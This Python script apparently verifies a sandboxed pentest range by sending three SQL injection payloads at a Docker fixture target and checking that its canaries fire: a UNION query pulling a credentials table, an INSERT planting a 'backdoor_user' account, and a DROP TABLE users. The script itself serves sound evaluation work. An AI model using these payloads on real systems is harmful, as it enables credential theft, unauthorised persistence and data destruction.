"""Manual exploit-chain verification for the SQLi third target, before any
live-validation scenario script depends on it -- same convention as
docs/research/experiment-log/2026-09-23_ssrf-target-manual-verification.md.

Requires Docker running. Run manually:
    python scripts/sqli_manual_verification.py
"""

from __future__ import annotations

import asyncio
from pathlib import Path

from omni_lyra.sandbox.pentest_range import PentestRange

FIXTURE_DIR = Path(__file__).resolve().parents[1] / "docker" / "pentest_fixtures_sqli"


async def main():
    print("Creating range with fixture:", FIXTURE_DIR)
    range_ = await PentestRange.create(fixture_dir=FIXTURE_DIR)
    try:
        print(f"credentials_flag={range_.credentials_flag!r}")

        # Issue requests via python's urllib inside the attacker container
        # (not raw curl) to avoid bash shell-quoting bugs contaminating the
        # verification of the SQL injection itself.
        exploits = {
            "union_exfil": "x' UNION SELECT id, secret_blob, 1 FROM credentials--",
            "insert_persist": "x'; INSERT INTO users (name,email) VALUES ('backdoor_user','x@evil.com');--",
            "drop_disrupt": "x'; DROP TABLE users;--",
        }

        async def do_search(name_value: str) -> str:
            import urllib.parse
            q = urllib.parse.quote(name_value)
            cmd = f"python3 -c \"import urllib.request; print(urllib.request.urlopen('http://target:8080/search?name={q}').read().decode())\""
            return await range_.run_on_attacker(cmd)

        async def do_health() -> str:
            cmd = "python3 -c \"import urllib.request; print(urllib.request.urlopen('http://target:8080/health').read().decode())\""
            return await range_.run_on_attacker(cmd)

        print("\n=== benign search ===")
        print(await do_search("alice"))

        print("\n=== health (before) ===")
        print(await do_health())
        print("priming _target_ever_healthy via _check_service_disrupted():",
              await range_._check_service_disrupted())

        print("\n=== EXPLOIT 1: credential exfil (UNION) ===")
        out = await do_search(exploits["union_exfil"])
        print(out)
        print("contains credentials_flag:", range_.credentials_flag in out if range_.credentials_flag else "N/A")

        print("\n=== persistent_changes canary (before insert) ===")
        changed_before = await range_._check_persistent_change()
        print("flagged:", changed_before)

        print("\n=== EXPLOIT 2: persistent change (INSERT) ===")
        out = await do_search(exploits["insert_persist"])
        print(out)

        print("\n=== persistent_changes canary (after insert) ===")
        changed_after = await range_._check_persistent_change()
        print("flagged:", changed_after)

        print("\n=== health (should still be OK after INSERT) ===")
        print(await do_health())

        print("\n=== EXPLOIT 3: service disruption (DROP TABLE) ===")
        out = await do_search(exploits["drop_disrupt"])
        print(out)

        print("\n=== health (after DROP, should now fail) ===")
        print(await do_health())

        print("\n=== service_disrupted check ===")
        disrupted = await range_._check_service_disrupted()
        print("flagged:", disrupted)

        print("\n=== persistent_changes canary (after DROP, should also fire) ===")
        changed_final = await range_._check_persistent_change()
        print("flagged:", changed_final)

        print("\n=== out_of_scope_contacts check (expected 0, this domain excludes it) ===")
        oos = await range_._check_out_of_scope_contact()
        print("flagged:", oos)

    finally:
        await range_.destroy()
        print("\nRange destroyed.")


if __name__ == "__main__":
    asyncio.run(main())
